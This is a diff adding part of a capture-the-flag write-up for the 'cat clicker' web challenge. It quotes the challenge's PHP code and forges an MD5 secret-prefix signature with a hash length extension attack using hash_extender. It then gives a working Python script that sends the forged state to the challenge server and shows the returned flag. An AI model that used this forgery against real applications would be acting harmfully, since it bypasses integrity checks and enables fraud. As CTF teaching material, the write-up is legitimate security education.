@@ -150,3 +150,81 @@ Thanks to this command, we are able to obtain the different sources of the *PHP 
 
 <a href="cat_clicker.zip" download>Click to Download</a>
 
+Reading the PHP sources, in *buy.php* we notice the initial presence of the mechanism for verifying the digital signature performed on the "state" extracted from the HTTP POST request (`!verifyState($state, $hash, true)`). If then this check is successful, it checks if *the number of cats* (in *$state*) that we own are greater than or equal to 13 and in that case it returns the flag:
+```php
+include('helper.php');
+
+$state = $_POST['state'];
+$hash = $_POST['hash'];
+$itemId = $_POST['item_id'];
+
+if(!isset($state) || !isset($hash) || !isset($itemId) || !verifyState($state, $hash, true) || ($itemId !== "1" && $itemId !== "2")) {
+       echo json_encode(array('success' => false));
+       die();
+}
+
+$cats = getCatsNo($state);
+$item = "";
+$ok = true;
+
+if($itemId === "1") {
+       if($cats >= 1) {
+               $cats -= 1;
+               $item = "FAKE-X-MAS{fake-flag-dont-submit-signed-yakuhito}";
+       } else {
+               $ok = false;
+       }
+} else {
+       if($cats >= 13) {
+               $cats = 1337;
+               $item = getenv("FLAG");
+       } else {
+               $ok = false;
+       }
+}
+```
+
+Going to read the code in *helper.php*, we find defined the method of verification and generation of the digital signature, which coincides with what was supposed before, but unfortunately the 64-character *secret value* is not "hardcoded" in clear code:
+
+```php
+
+function hashFor($state) {
+       $secret = getenv("SECRET_THINGY"); // 64 random characters - impossible to guess
+       $s = "$secret | $state";
+       return md5($s);
+}
+
+
+function verifyState($state, $hash) {
+       return $hash === hashFor($state);
+}
+
+```
+So to *forge* a fake `"state": "13 | 13"` that can bypass the signature verification, we need to take advantage of a particular attack called `Hash Length Extension attacks` (https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks), which can be performed on the MD5 when used in a scenario described as follows:
+"*An application is susceptible to a hash length extension attack if it prepends a secret value to a string, hashes it with a vulnerable algorithm, and entrusts the attacker with both the string and the hash, but not the secret. Then, the server relies on the secret to decide whether or not the data returned later is the same as the original data.*" (`this is exactly the same scenario as the challenge, so this attack can be exploited`)
+
+Using a particular tool (https://github.com/iagox86/hash_extender), it was possible to generate the *new state* (containing *"13 | 13"*) and the new *valid signature*, without knowing the *prepended 64-character secret*:
+
+```console
+matt@grol:~$ ./hash_extender -d "12 | 0" -s cf13ab76afb625f7f7d6c539c2cb3c84 -a "13 | 13" -f md5 -l 67
+Type: md5
+Secret length: 67
+New signature: 8ec4883990c9f7fc76f3514fcd5d4597
+New string: 3132207c2030800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000048020000000000003133207c203133
+```
+
+Now all that remains is to send to */api/buy.php*, an *HTTP POST request* with the new "state" (`3132207c2030800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000048020000000000003133207c203133`) generated (which contains "13 | 13"), the returned *hash value* (`8ec4883990c9f7fc76f3514fcd5d4597`) representing the correct digital signature and finally set the *"item_id"* to 2 (to indicate that we want to "buy" the real flag) (N.B the "state" must be converted from hex to ascii):
+
+```python
+import requests
+
+burp0_url = "http://challs.xmas.htsp.ro:3003/api/buy.php"
+burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0", "Accept": "*/*", "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "http://challs.xmas.htsp.ro:3003/", "Content-Type": "multipart/form-data; boundary=---------------------------218239473026991957432047946206", "Origin": "http://challs.xmas.htsp.ro:3003", "Connection": "close"}
+burp0_data = "-----------------------------218239473026991957432047946206\r\nContent-Disposition: form-data; name=\"state\"\r\n\r\n"+"3132207c2030800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000048020000000000003133207c203133".decode('hex')+"\r\n-----------------------------218239473026991957432047946206\r\nContent-Disposition: form-data; name=\"hash\"\r\n\r\n8ec4883990c9f7fc76f3514fcd5d4597\r\n-----------------------------218239473026991957432047946206\r\nContent-Disposition: form-data; name=\"item_id\"\r\n\r\n2\r\n-----------------------------218239473026991957432047946206--\r\n"
+print(requests.post(burp0_url, headers=burp0_headers, data=burp0_data).text)
+```
+And finally:
+```console
+matt@grol:~$ python2 exploit.py 
+{"state":"12 | 1337","hash":"52586134e945c681089af25c36a1866f","success":true,"item":"X-MAS{1_h4v3_s0_m4ny_c4t5_th4t_my_h0m3_c4n_b3_c0ns1d3r3d_4_c4t_sh3lt3r_aaf30fcb4319effa}"}
+```
